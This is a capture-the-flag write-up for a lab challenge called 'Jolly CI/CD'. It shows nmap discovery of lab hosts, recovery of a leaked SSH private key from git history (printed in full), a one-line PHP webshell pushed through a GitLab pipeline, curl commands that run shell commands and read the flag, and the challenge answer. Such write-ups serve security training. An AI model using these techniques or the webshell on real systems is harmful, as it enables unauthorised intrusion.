# Jolly CI/CD

![](../../../resources/screenshots/jollycicd-prompt.png)

We also know that `Tinsel Upatree` has given critical information for this challenge:

```
Great! Thanks so much for your help!

Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on!

Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly.

With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production.

WHOOPS! I didn’t mean to commit that to `http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`...

Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!
```

---

- After some hopeless poking around locally, I checked my IP (was `172.18.0.99/16`) and did a simple nmap scan for other available hosts (*note: on subsequent tests, it took a while for these hosts to come up, so you have to be patient*):

	- `nmap 172.17.0.1/24 -sP`
	
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-09 05:35 GMT
Nmap scan report for 172.18.0.1
Host is up (0.00020s latency).
MAC Address: 02:42:2F:A5:F3:D3 (Unknown)
Nmap scan report for wordpress-db.local_docker_network (172.18.0.87)
Host is up (0.00013s latency).
MAC Address: 02:42:AC:12:00:57 (Unknown)
Nmap scan report for wordpress.local_docker_network (172.18.0.88)
Host is up (0.000084s latency).
MAC Address: 02:42:AC:12:00:58 (Unknown)
Nmap scan report for gitlab.local_docker_network (172.18.0.150)
Host is up (0.000038s latency).
MAC Address: 02:42:AC:12:00:96 (Unknown)
Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.82 seconds
```

- OK - so we see a gitlab server afterall! We also see `grinchum-land.flag.net.internal` - I recall Tinsel mentioning this earlier: `http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`. What if we replace the gitlab.flag.net.internal with the hostname we found via nmap?
	- `git clone http://gitlab.local_docker_network/rings-of-powder/wordpress.flag.net.internal.git`

- It worked! Now we have the git repository that we know is linked to a gitlab-runner, and can kick off changes to their wordpress website!  

![](../../../resources/screenshots/jollycicd-ciconfig.png)

- We'll need to learn more. If we run `git log`, we see a commit with the message **whoops**.  Looking deeper, we actually find an SSH public/private key:

![](../../../resources/screenshots/jollycicd-gitlog.png)

- `git log e19f653bde9ea3de6af21a587e41e7a909db1ca5 -p`
 ![](../../../resources/screenshots/jollycicd-pubprivssh.png)

- The public key is: 
`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com`
- The private key is:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```
 
- We place these into `~/.ssh/id_ed25519.pub` and `~/.ssh/id_ed25519` respectively, and set `chmod 0700 ~/.ssh/id_ed25519`. 
- Then we test using `ssh -T git@gitlab.local_docker_network` and it greets us as the user **"knee-oh"**
- We need to also let git know to use these vs. using https:
	- `git remote set-url origin git@gitlab.local_docker_network:knee-oh/rings-of-powder/wordpress.flag.net.internal.git`
- Now that we've got this all set up nice and good, I `rm -rf` the existing clone and re-clone it using SSH:
	- `git clone git@gitlab.local_docker_network:rings-of-powder/wordpress.flag.net.internal.git`
- I make an empty file just to test and see if this all works:
![](../../../resources/screenshots/jollycicd-testpush.png)

- We're in business!!! I modify the root `index.php` to be the most basic of webshells:

```php
<?=`$_GET[0]`?>
```

- `curl http://wordpress.local_docker_network/index.php?0=whoami`:

![](../../../resources/screenshots/jollycicd-rce.png)

- While looking for the flag, we check the root directory and see flag.txt. Reading it, we get our flag!

`curl -L http://wordpress.local_docker_network/index.php?0='cat%20/flag.txt'`

![](../../../resources/screenshots/jollycicd-flag.png)

Answer: **oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT**

Back to the [Elfen room](../README.md)!